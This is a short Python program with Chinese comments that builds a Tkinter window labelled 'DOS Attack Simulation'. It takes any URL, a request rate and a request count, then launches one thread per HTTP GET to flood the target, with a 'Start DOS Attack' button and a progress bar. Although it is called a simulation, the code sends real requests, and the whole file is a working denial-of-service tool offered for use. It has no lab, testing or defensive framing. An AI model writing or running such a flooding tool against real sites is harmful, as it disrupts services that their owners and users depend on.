import requests
from tqdm import tqdm
import threading
import time
import tkinter as tk
from tkinter import ttk

# 定义 dos 函数，用于发送单个请求并更新进度
def dos(url, progress_var, total_requests):
    try:
        requests.get(url)  # 发送 GET 请求
    except requests.exceptions.RequestException:  # 捕获请求异常
        pass
    progress_var.set(progress_var.get() + 100 / total_requests)  # 更新进度变量
    if progress_var.get() < total_requests:  # 如果进度未完成，则更新进度条
        progress_bar['value'] = (progress_var.get() / total_requests) * total_requests

# 定义 doss 函数，用于创建多个线程来模拟 DOS 攻击
def doss(url, frequency, times, progress_var):
    threads = []  # 初始化线程列表
    for _ in range(times):  # 根据请求次数创建线程
        thread = threading.Thread(target=dos, args=(url, progress_var, times))  # 创建线程
        threads.append(thread)
        thread.start()  # 启动线程
        time.sleep(1 / frequency)  # 控制请求频率
    for thread in threads:  # 等待所有线程完成
        thread.join()

# 定义 start_dos 函数，用于启动 DOS 攻击模拟
def start_dos():
    url = url_entry.get()  # 获取 URL 输入
    frequency = int(frequency_entry.get())  # 获取频率输入
    times = int(times_entry.get())  # 获取请求次数输入
    if 'http://' not in url and 'https://' not in url:  # 如果 URL 没有协议头，则添加 https
        url = 'https://' + url
    progress_var.set(0)  # 重置进度变量
    progress_bar['value'] = 0  # 重置进度条
    threading.Thread(target=doss, args=(url, frequency, times, progress_var)).start()  # 启动攻击线程

# 创建主窗口
root = tk.Tk()
root.title("DOS Attack Simulation")  # 设置窗口标题
root.geometry("400x300")  # 设置窗口大小

# 创建 URL 输入框及其标签
url_label = tk.Label(root, text="URL:")
url_label.pack(pady=5)
url_entry = tk.Entry(root, width=50)
url_entry.pack(pady=5)

# 创建频率输入框及其标签
frequency_label = tk.Label(root, text="Frequency (requests per second):")
frequency_label.pack(pady=5)
frequency_entry = tk.Entry(root, width=50)
frequency_entry.pack(pady=5)

# 创建请求次数输入框及其标签
times_label = tk.Label(root, text="Number of Requests:")
times_label.pack(pady=5)
times_entry = tk.Entry(root, width=50)
times_entry.pack(pady=5)

# 创建启动按钮
start_button = tk.Button(root, text="Start DOS Attack", command=start_dos)
start_button.pack(pady=20)

# 创建进度条及其变量
progress_var = tk.IntVar()
progress_bar = ttk.Progressbar(root, length=300, mode='determinate', variable=progress_var)
progress_bar.pack(pady=10)

# 运行 Tkinter 事件循环
root.mainloop()